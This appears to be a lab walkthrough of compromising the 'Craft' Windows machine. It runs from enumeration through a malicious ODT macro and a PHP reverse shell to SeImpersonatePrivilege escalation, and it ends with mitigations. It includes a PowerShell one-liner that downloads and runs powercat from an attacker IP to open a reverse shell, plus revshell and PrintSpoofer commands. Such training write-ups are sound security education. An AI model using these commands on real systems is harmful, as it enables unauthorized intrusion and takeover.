## Introduction

In this walkthrough, I tackled the **Craft** intermediate Windows machine. Port 80 revealed a file upload feature that accepted `.odt` documents. I crafted a malicious macro and uploaded it, which eventually triggered and granted a reverse shell as a local user. From there, I uploaded a **PHP reverse shell** to a web-accessible directory and accessed it via browser, gaining access as the `apache` user. This user possessed the `SeImpersonatePrivilege`, which I exploited using **PrintSpoofer**, ultimately obtaining a shell as `NT AUTHORITY\SYSTEM`.

## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
sudo nmap -sV $IP --open -Pn
```

### UDP

Check top 100 UDP ports:

```bash
sudo nmap -sU -F $IP -Pn
```

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n -v --open -Pn
```

## Services

## Web

### Port 80

Version: Apache httpd 2.4.48

Add the domain to `/etc/hosts` file:

![image.png](image%202.png)

```bash
gobuster dir -u http://craft.offsec/ -w /usr/share/wordlists/dirb/common.txt -t 30 -b 404,403,400 -x .php
```

**Vhost Fuzzing**

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://craft.offsec/ -H 'Host: FUZZ.craft.offsec' -fs 9635
```

We can only submit `odt` files:

Following this [post](https://medium.com/@akshay__0/initial-access-via-malicious-odt-macro-ac7f5d15796d) I created an `.odt` document and uploaded it.

We can inject reverse shell in `odt` macros.

```bash
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.191/powercat.ps1');powercat -c 192.168.45.191 -p 4242 -e cmd"
```

You can also use [this](https://github.com/jotyGill/macro-generator)  to generate macro code, and [this one](https://github.com/0bfxgh0st/MMG-LO) to create full file with macros automatically.

I am using `cmd /c` before the command as LibreOffice Basic (or VBScript, depending on the environment) may not handle complex shell commands properly unless wrapped in `cmd /c`, especially with parameters like `-enc` which expects to be interpreted in the context of a full command line.

Now I have a shell.

## Shell as thecybergeek

From the early enumeration we remember there was uploads directory on the server which we can list from browser:

![image.png](image%2010.png)

As we also have the user `apache`:

![image.png](image%2011.png)

I am gonna try to get a reverse shell as `apache` too. Most probably web server is run by apache user, and it could have additional privileges that we can leverage. As server executes `.php` files I am gonna put reverse shell PHP file under `uploads` directory.

## Shell as Apache

Now we are `apache` user.

As you can see now we have powerfull `SeImpersonatePrivilege`. I am gonna abuse this privilege using [`SigmaPotato.exe`](https://github.com/tylerdotrar/SigmaPotato.)

```powershell
.\SigmaPotato.exe --revshell 192.168.45.159 4445
```

![image.png](image%2014.png)

It didnâ€™t work for some reason, I am gonna use old [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) method.

```powershell
.\PrintSpoofer.exe -i -c cmd
```

## Mitigation

- Disable or sandbox **macro execution** in office documents uploaded via web interfaces.
- Implement **file content inspection and AV scanning** on uploaded files.
- Restrict **web server write permissions** and monitor for unauthorized scripts.
- Avoid assigning **SeImpersonatePrivilege** to low-privileged users or services.
- Use **Application Whitelisting** and **Credential Guard** to reduce lateral movement and token impersonation risks.
